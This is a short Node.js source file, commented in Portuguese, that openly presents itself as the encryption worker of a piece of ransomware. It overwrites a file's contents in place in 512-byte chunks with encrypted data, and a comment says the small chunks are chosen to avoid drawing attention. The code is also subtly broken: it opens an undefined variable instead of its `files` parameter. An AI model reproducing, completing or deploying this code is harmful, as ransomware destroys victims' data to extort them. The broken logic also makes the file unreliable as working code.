const fs = require("fs");
/**
 * O ransomware vai ler os arquivos por pequenas partes para não chamar atenção
 * e por isto, irá armazenar os bytes lidos em um Buffer do tamanho do chunkSize
 * depois disso vai encriptar o Buffer e por fim, irá salvar ele no mesmo local
 * onde estava antes (position), dentro do arquivo. **/
const worker = files => cipher => {
    var chunkSize = 512, // pedaço a ser encriptado do arqv, vai ler até esses 512c de forma binaria, parar e comecar a encriptrar o arqv
        position = 0, // posição dentro do arquivo, para ler os bytes a partir dela
        bytesRead = 0, // quantidade de dados lidos em cada loop de leitura (usada no loop)

        buffer = Buffer.alloc(chunkSize);

    const fileDescriptor = fs.openSync(file, "rs+"); // abrindo o arv

    bytesRead = fs.readSync(fileDescriptor, buffer, 0, chunkSize, position);
    // le a quantidade bytes especificada em `chunkSize` a partir do ponto armazenado em `position`

    while (bytesRead > 0) {
        // encripta o conteudo lido do arquivo
        var content = cipher.update(buffer)

        // escreve os dados processados no arquivo na posicao q ele encontrou
        const wc = fs.writeSync(fileDescriptor, content, 0, content.length, position);


        position += wc

        bytesRead = fs.readSync(fileDescriptor, buffer, 0, chunkSize, position);

    } fs.closeSync(fileDescriptor);

    // toda essa funcao vai retornar quando finalizar os arqv encriptado
};

module.exports = worker;